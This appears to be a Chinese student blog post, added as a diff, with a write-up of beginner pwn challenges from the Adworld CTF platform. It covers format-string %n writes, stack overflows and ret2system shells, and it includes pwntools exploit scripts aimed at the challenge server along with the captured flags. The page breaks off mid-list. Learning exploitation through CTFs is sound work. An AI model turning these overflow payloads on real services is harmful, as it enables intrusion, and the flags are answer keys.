@@ -1,0 +1,1466 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="攻防世界-pwn入门练习, NEUQ  CTF 子实  ZiShi 计算机科学与技术 网络安全">
+    <meta name="baidu-site-verification" content>
+    <meta name="google-site-verification" content>
+    <meta name="description" content="攻防世界-pwn入门练习get_shell
+直接运行即可，nc连接，cat flag获得flag
+
+
+
+
+CGfsb菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用
+
+下载了一个文件，查看文件信息, 发现是elf文件：
+
+">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>攻防世界-pwn入门练习 | ZS BLOG</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    <script>
+        var _hmt = _hmt || [];
+        (function () {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?46e79e71af0709a5b9106bf20cecc493";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">ZS BLOG</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/contact" class="waves-effect waves-light">
+            
+            <span>留言板</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">ZS BLOG</div>
+        <div class="logo-desc">
+            
+            东北大学秦皇岛分校 | 计算机科学与技术 | 网络安全
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-link"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-link"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-link"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-link"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-link"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-link"></i>
+                
+                友情链接
+            </a>
+        </li>
+        
+        <li>
+            <a href="/contact" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-link"></i>
+                
+                留言板
+            </a>
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/newlzs" class="waves-effect waves-light" target="_blank">
+                <i class="fa fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/newlzs" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/25.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        攻防世界-pwn入门练习
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 20px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                        <a href="/tags/CTF/" target="_blank">
+                            <span class="chip bg-color">CTF</span>
+                        </a>
+                        
+                        <a href="/tags/竞赛/" target="_blank">
+                            <span class="chip bg-color">竞赛</span>
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                        <a href="/categories/网络安全/" class="post-category" target="_blank">
+                            网络安全
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2019-09-14
+                </div>
+
+                <div class="post-author info-break-policy">
+                    <i class="fa fa-user-o fa-fw"></i>作者:&nbsp;&nbsp;
+                    
+                    子实
+                    
+                </div>
+
+                
+                
+                <div class="info-break-policy">
+                    <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    11 分
+                </div>
+                
+                
+
+                
+                <div id="busuanzi_container_page_pv" class="info-break-policy">
+                    <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                    <span id="busuanzi_value_page_pv"></span>
+                </div>
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="攻防世界-pwn入门练习"><a href="#攻防世界-pwn入门练习" class="headerlink" title="攻防世界-pwn入门练习"></a>攻防世界-pwn入门练习</h1><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h2><ul>
+<li>直接运行即可，nc连接，cat flag获得flag<ul>
+<li><img src="https://pic.superbed.cn/item/5d725367451253d178a1020f.jpg" alt></li>
+</ul>
+</li>
+</ul>
+<h2 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h2><p><code>菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用</code></p>
+<ul>
+<li><p>下载了一个文件，查看文件信息, 发现是elf文件：<img src="https://ae01.alicdn.com/kf/H5e290d1e577740ec974489f511b7270aJ.jpg" alt></p>
+</li>
+<li><p>ida 反编译查看源码：<img src="https://ae01.alicdn.com/kf/H4ef691700fcc4977bc3c0fcdac8b1740V.jpg" alt></p>
+</li>
+<li><p>根据题意，应该是要利用printf的格式化字符串漏洞，而且第<code>printf(&amp;s)</code>又明显的漏洞，与之相邻的语句很清晰的表示了，只要pwnme的值为8便会输出flag。有位博主写的这篇关于格式化字符串漏洞的<a href="http://winny.work/%e4%b8%80%e7%af%87%e6%96%87%e7%ab%a0%e6%90%9e%e6%87%82%e6%a0%bc%e5%bc%8f%e5%8c%96%e5%ad%97%e7%ac%a6%e4%b8%b2%e6%bc%8f%e6%b4%9e/358.html" target="_blank" rel="noopener">博客</a>挺好的，建议看看。还有一篇是讲内存溢出的<a href="https://www.anquanke.com/post/id/85138" target="_blank" rel="noopener">博客</a>通俗易懂还设计到了bss，不理解的可以看看。</p>
+</li>
+<li><p>接下来就要确定pwnme的位置：<img src="https://ae01.alicdn.com/kf/Haa4a6b60accf4ecc87e8f2892e32a6c6J.jpg" alt></p>
+</li>
+<li><p>pwnme在_bss端，说明它是一个全局变量，那我们要修改它，就要利用到格式化字符串漏洞中的%n</p>
+</li>
+<li><p>找到偏移量<img src="https://ae01.alicdn.com/kf/He37eee47b4cb4bcc9b6f0f5ce3be9a19P.jpg" alt></p>
+<p>61616161就是我们要找的值，a的ascii的值的16进制格式，可以看到偏移量是10；</p>
+</li>
+<li><p>接下来就是把这个地方改成pwnme的地址（0x0804A068）,然后用%n对pwnme赋值为8即使printf输出8个字符 -&gt; <code>p32() 转换为4字节 + ‘aaaa’4字节 = 8 字节</code>，构造exp：<img src="https://pic.superbed.cn/item/5d730a8b451253d178b4e92c.jpg" alt></p>
+</li>
+<li><p>这就得到了答案，这里我还不明白的使写的这个exp使如何给pwnme赋值的？？？？？</p>
+</li>
+<li><p>感谢这位博主的<a href="https://blog.csdn.net/qq_43394612/article/details/85196669" target="_blank" rel="noopener">文章</a>,  帮了很大忙。</p>
+<ul>
+<li>输入一个<code>地址</code>+<code>补足字符串</code>+<code>%10$n</code> = <code>串A</code>，执行<code>printf</code>函数的时候<code>串A</code>的首地址会存入栈中的一个位置，即偏移量10，<strong>看到有位博主说：输入的字符串的前4个字节如果是一个有效的字符串的首地址，就可以用%s将其打印出来</strong>，也就是说如果是<strong>地址+串</strong>那么便会将这个地址作为这个串的首地址。这样子便实现了将我们的<code>pwnme</code>的地址作为串的首地址存入到栈中。之后我们在将其输出便会输出这个串A，而我们在串尾使用了%10$n又取到这个首地址并将其值赋为输出的字符数。</li>
+<li>感觉应该就是这样，终于理解啦，哈哈哈哈哈哈哈哈哈哈哈哈哈哈。搞了一天，终于明白了，加油啊^_^。</li>
+</ul>
+</li>
+</ul>
+<h2 id="when-did-you-bord"><a href="#when-did-you-bord" class="headerlink" title="when_did_you_bord"></a>when_did_you_bord</h2><p><code>只要知道你的年龄就能获得flag，但菜鸡发现无论如何输入都不正确，怎么办</code></p>
+<ul>
+<li><p>基操</p>
+<ul>
+<li><p>查看文件信息， 没有开启PIE(一种可执行文件的属性，相当于可执行文件的保护机制)<a href="[https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/](https://introspelliam.github.io/2017/09/30/linux程序的常用保护机制/)">关于可执行文件保护机制的介绍</a></p>
+<p><img src="https://ae01.alicdn.com/kf/H8d89e82cdd48455ca4de99d5c6333cc68.jpg" alt></p>
+</li>
+<li><p>运行一下  ，发现就是让我们输入生日和姓名，然后输出我们的信息</p>
+<p><img src="https://ae01.alicdn.com/kf/Hab69db1576774589b401d0e2d64ff127L.jpg" alt></p>
+</li>
+<li><p>放到IDA里看看</p>
+<p><img src="https://ae01.alicdn.com/kf/Ha5b1dec9896943148c5e34a4572ffc24q.jpg" alt></p>
+</li>
+</ul>
+</li>
+<li><p>基操完了，就要动脑子了</p>
+<ul>
+<li><p>发现只要将v5的值修改为1926便会输出flag，我们可以利用栈溢出，使v4溢出从而实现对v5值的修改，查看v4和v5的位置</p>
+<p><img src="https://ae01.alicdn.com/kf/Hee77e09116c14ac49482634f807512bc2.jpg" alt></p>
+</li>
+<li><p>可以看到v4占了8字节，下面便是v5，只要让v4溢出的部分修改v5为1926即可</p>
+</li>
+<li><p>利用下面的代码实现溢出</p>
+<ul>
+<li><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+a <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"55616"</span><span class="token punctuation">)</span>
+a<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Birth?"</span><span class="token punctuation">)</span>
+a<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span>
+a<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Name?"</span><span class="token punctuation">)</span>
+a<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1926</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+a<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+</ul>
+</li>
+<li><p>得到falg    <img src="https://ae01.alicdn.com/kf/H6714011bd89445a1a0091c03d364b17bC.jpg" alt></p>
+</li>
+<li><p>答案：<code>cyberpeace{54fc1533fefdce65285602c7ad5ab774}</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h2><p><code>pwn！，segment fault！菜鸡陷入了深思</code></p>
+<ul>
+<li><p>基操</p>
+<ul>
+<li><p>查看文件信息，文件属性：64位，没有开启PIE。</p>
+<p><img src="https://ae01.alicdn.com/kf/H1b75f9cbe9794c3ab3c3c478c40d3af1L.jpg" alt></p>
+</li>
+<li><p>运行一下，看不出一点信息，giao</p>
+<p><img src="https://ae01.alicdn.com/kf/H4f1a35c06b024bdf99d214fd588fa012U.jpg" alt></p>
+</li>
+<li><p>再用IDA看一下</p>
+<p><img src="https://ae01.alicdn.com/kf/Haac1b846e45d4c64b874ad270da9b07cq.jpg" alt></p>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>好像什么也看不出来，对于我这只小白来说，但是呢第九行他就是执行<code>cat flag</code>的, 大佬nb，接下来当然是查看变量的位置啦</p>
+<p><img src="https://ae01.alicdn.com/kf/H73e7e547d2cb4ccd9e6e6f861b102da2M.jpg" alt></p>
+<p>巧了，输入的那个和最后执行判断语句的那个是挨着的，利用内存溢出不就可以对后者进行赋值了吗，和上一题一样</p>
+</li>
+<li><p>直接上exp：</p>
+<ul>
+<li><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+a <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"35001"</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1853186401</span><span class="token punctuation">)</span>
+
+a<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"lets get helloworld for bof\n"</span><span class="token punctuation">)</span>
+a<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+a<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>执行代码返回结果</p>
+<p><img src="https://ae01.alicdn.com/kf/H7060e8019d064297a2169d5215a473aci.jpg" alt></p>
+</li>
+</ul>
+</li>
+<li><p>答案 <code>cyberpeace{1c15d7a71ed08427b1c638a78f8ab206}</code></p>
+</li>
+</ul>
+<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p><code>菜鸡了解了什么是溢出，他相信自己能得到shell</code></p>
+<ul>
+<li><p>基操</p>
+<ul>
+<li><p>看看文件信息，没有开 canary，PIE 也是关闭的，但是栈不可执行。也就是说我们可以进行溢出，但是不能将 shellcode 写在栈上，因为现在栈上的代码是不能被执行的<img src="https://ae01.alicdn.com/kf/H43d4cce511e247c28f5448df350185e4C.jpg" alt></p>
+</li>
+<li><p>跑一下，就输出了一个hello word，嗯。。。。。</p>
+<p><img src="https://ae01.alicdn.com/kf/Hc211307f822b4c708b1bce5fbab30869P.jpg" alt></p>
+</li>
+<li><p>IDA看一看</p>
+<p><img src="https://ae01.alicdn.com/kf/Hdbe32acc81ea42b19cfb48f2adcea787t.jpg" alt></p>
+<p>main函数没什么东西，发现不了什么，接着找<code>vulnerable_function</code></p>
+<p><img src="https://ae01.alicdn.com/kf/Hf0fe327496694e32b6fc7dc78d074e1av.jpg" alt></p>
+<p>好像也没有什么，没办法，都看看吧</p>
+<p><img src="https://ae01.alicdn.com/kf/H0848ea9d7746407ab1d3c156e0dcbdb2Y.jpg" alt></p>
+<p>发现这个名为callsystem的函数应该就是用于返回shell的，没错就是它了，去吧比卡丘，就决定是你啦。</p>
+</li>
+</ul>
+</li>
+<li><p>接下来的目的就是想办法执行这个函数，接下啦我这个真正的小白就什么也不会了，学吧</p>
+<ul>
+<li><p>想要执行这个函数，就要在函数调用返回的时候修改eip（<a href="https://blog.csdn.net/chenlycly/article/details/37912755" target="_blank" rel="noopener">eip是啥</a>），进行<a href="https://blog.csdn.net/linyt/article/details/48738757" target="_blank" rel="noopener">rop</a>攻击。</p>
+</li>
+<li><p>首先还是需要寻找溢出点， <code>vulnerable_function</code>中的read函数存在缓冲区溢出漏洞。</p>
+</li>
+<li><p>查看变量地址， ida告诉我们r代表的就是return address</p>
+<p><img src="https://ae01.alicdn.com/kf/Hb268c696049848818d9e09f844523adaX.jpg" alt></p>
+<p>发现buf的首地址和栈上的返回地址的距离是： (+0x0000000000000008 ) - (-0x0000000000000080 ) = 0x88, 也就是说buf的大小只有128（0x88）,我们只要将128填满，再将溢出的那部分进行操作即可</p>
+</li>
+<li><p>接着找到<code>callsystem</code>函数的地址， 地址为<code>0x400596</code></p>
+<p><img src="https://ae01.alicdn.com/kf/H59858b0cc6404edcac7791b62016597e6.jpg" alt></p>
+</li>
+<li><p>接着构建exp，</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+a <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">30046</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">0x88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x400596</span><span class="token punctuation">)</span>
+
+a<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span>
+a<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+a<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>执行代码，返回结果</p>
+<p><img src="https://ae01.alicdn.com/kf/H88117b6277e64eea94e9d53939a7d133H.jpg" alt></p>
+<p>执行代码，进入shell，所以还要进行一些交互才能获取结果。</p>
+</li>
+</ul>
+</li>
+<li><p>答案：<code>cyberpeace{fabe8b6d58bfb06bac3e72bd26525a35}</code></p>
+</li>
+</ul>
+<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><code>菜鸡请教大神如何获得flag，大神告诉他‘使用</code>面向返回的编程<code>(ROP)就可以了</code></p>
+<ul>
+<li><p>基操</p>
+<ul>
+<li><p>查看文件信息，32位的文件，还是没有开启PIE，canary没有找到，但是呢NX这项保护是开启的状态，这意味着：栈中数据没有执行权限，常用的call esp或者jmp esp的方法在这里就不能使用辽，但是可以利用rop这种方法绕过</p>
+<p><img src="https://ae01.alicdn.com/kf/H7e503aa92f714d0c84caebf10d513be5x.jpg" alt></p>
+</li>
+<li><p>运行一下，没什么收获</p>
+<p><img src="https://ae01.alicdn.com/kf/Hb78b6d120cef49699920316517d34d7dD.jpg" alt></p>
+</li>
+<li><p>扔进IDA看看</p>
+<p>main函数没什么特别的</p>
+<img src="https://ae01.alicdn.com/kf/H9f1ae1742a8646978f5d5afb833768e7e.jpg">
+</li>
+</ul>
+</li>
+<li><p>但是嗯，vulnerable_function()的read函数好像存在堆栈溢出点，emmmm，</p>
+<p><img src="C:%5CUsers%5CMAIBENBEN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1568118181710.png" alt="1568118181710"></p>
+</li>
+<li><p>接下来就是要想办法找到调用shell的函数的地址。<code>shift + f12</code> 查看字符串</p>
+<img src="https://ae01.alicdn.com/kf/H6cc08f53526a4a58a456589ce1215578I.jpg">
+
+<p>有点东西，一个是system，还有一个就是/bin/sh, 接下来要做的就是想办法调用system(“/bin/sh”);</p>
+</li>
+<li><p>计算一下偏移量 </p>
+<img src="https://ae01.alicdn.com/kf/Hf3dc0afa670842b182117d1d44a7e04aY.jpg">
+
+<img src="https://ae01.alicdn.com/kf/Hf5aacacfe3404f97b17f536766a17bd3L.jpg">
+
+<p>偏移量 = 0x4 + 0x88</p>
+</li>
+<li><p>找到<code>system</code>函数于字符串<code>&quot;/bin/sh&quot;</code>的地址，今天我才知道，原来可以直接使用python 的pwn库直接获取地址，之前都是用IDA自己手动找的。哼，giao</p>
+</li>
+<li><p>构建exp,  方案：构造一个system(“/bin/sh”)的伪栈帧，然后通过控制vulnerable_function() 函数返回到该伪栈帧执行system(“/bin/sh”)来get shell。</p>
+<p>把system以及bin/sh构造进payload<br>payload = ‘a’ * (0x88 + 0x4) + p32(sys_addr) + p32(0) + p32(bin_addr)<br>其中p32(0)为system(“/bin/sh”)执行后的返回地址，整上个0就能行。</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./level2"</span><span class="token punctuation">)</span>
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'111.198.29.45'</span><span class="token punctuation">,</span> <span class="token number">47650</span><span class="token punctuation">)</span>
+sys_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># get the address of the function</span>
+bin_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># get the address of the string</span>
+payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x88</span> <span class="token operator">+</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>运行的到结果</p>
+<img src="https://ae01.alicdn.com/kf/H0143a7e3225c46a2a10312f1f312d617A.jpg">
+</li>
+<li><p>对函数栈的理解：函数地址+返回地址+-变量地址，， 纯属小白理解，勿信。</p>
+<p>我们实际上是使用我们需要的函数地址对能够执行函数的返回地址进行了覆盖，实际上函数的返回地址本身也是其他函数的地址，一个函数执行结束后便会执行返回地址所指向的函数。</p>
+</li>
